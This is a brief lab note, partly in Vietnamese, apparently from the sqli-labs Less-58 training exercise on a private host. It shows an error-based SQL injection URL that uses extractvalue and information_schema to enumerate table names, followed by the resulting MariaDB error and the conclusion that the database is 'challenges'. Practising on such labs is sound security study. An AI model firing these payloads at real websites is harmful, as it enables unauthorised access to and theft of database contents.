

```
http://10.10.10.171/sqli-labs/Less-58/index.php?id=0'union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e)) --+
```

output

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '��challenges’),0x7e)) -- ' LIMIT 0,1' at line 
```

=> db là `challenges`

làm tiếp các bước như bình thường